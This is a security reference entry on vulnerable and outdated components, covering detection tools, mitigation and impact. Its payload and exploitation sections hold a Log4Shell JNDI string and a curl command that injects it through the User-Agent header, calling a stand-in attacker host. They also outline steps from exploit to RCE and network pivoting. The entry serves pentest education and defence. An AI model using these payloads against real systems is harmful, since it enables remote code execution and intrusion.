📌 Outdated Libraries & Dependencies

🧠 Description

What is the vulnerability?

Client‑side or server‑side libraries (jQuery, React, Angular, Log4j, OpenSSL) have known CVEs that are not patched. Attackers can exploit these vulnerabilities to compromise the application.

Why does it occur?

Lack of dependency scanning, no update policy, or fear of breaking changes.

Security principle violated: Vulnerable Components

Real-world analogy: Using a 10‑year‑old antivirus signature – it won't detect new threats.

🏷️ Classification

  • Type: Vulnerable Components
  • OWASP: A06:2021 – Vulnerable and Outdated Components
  • CWE: CWE-1104: Use of Unmaintained Third Party Components

🎯 Attack Surface

  • ✅ JavaScript libraries with known XSS/RCE (e.g., older jQuery, AngularJS sandbox escapes)
  • ✅ Server‑side libraries (Log4Shell, Struts2, Spring4Shell)
  • ✅ PHP libraries (Composer dependencies with CVEs)
  • ✅ Frontend frameworks with prototype pollution vulnerabilities

🔍 Detection Methodology

1. Manual Testing

  • Check package.json, composer.lock, pom.xml if accessible.
  • Use browser devtools to view loaded library versions.
  • Check response headers for Server, X‑Powered‑By.

2. Automated Scanning

# Run npm audit for Node.js projects
npm audit

# OWASP Dependency-Check
dependency-check --scan . --format HTML

# Retire.js for JavaScript libraries
retire --path .

# Nuclei template for Log4j
nuclei -t cves/2021/CVE-2021-44228.yaml -target https://target.com

💣 Basic Payloads (Example: Log4Shell)

${jndi:ldap://attacker.com/exploit}

🚀 Advanced Exploitation

# Use nuclei to scan for known vulnerable versions
nuclei -t technologies/ -target https://target.com

# Exploit CVE-2021-44228 (Log4Shell) via User-Agent
curl -H "User-Agent: ${jndi:ldap://attacker.com/a}" https://target.com

✔ Must be reproducible

⚙️ Exploitation Steps

  1. Detect outdated library version.
  2. Search for public exploit (Exploit‑DB, CVE details, Nuclei templates).
  3. Execute exploit to gain RCE, XSS, or data leakage.
  4. Escalate privileges or pivot to internal network.

🛡️ Mitigation

✅ Regularly update dependencies (use Dependabot, Renovate).
✅ Use software composition analysis (SCA) tools.
✅ Remove unused libraries.
✅ Subscribe to security advisories for frameworks used.
✅ Implement a patch management policy.

🔓 Mitigation Bypass

  • If patched but still vulnerable due to backported fix not fully addressing the issue.
  • If transitive dependencies are not updated even when the direct dependency is updated.

⚠️ Risk / Impact

Severity: High to Critical

Impact: RCE, data breach, XSS, SSRF, privilege escalation depending on the component.
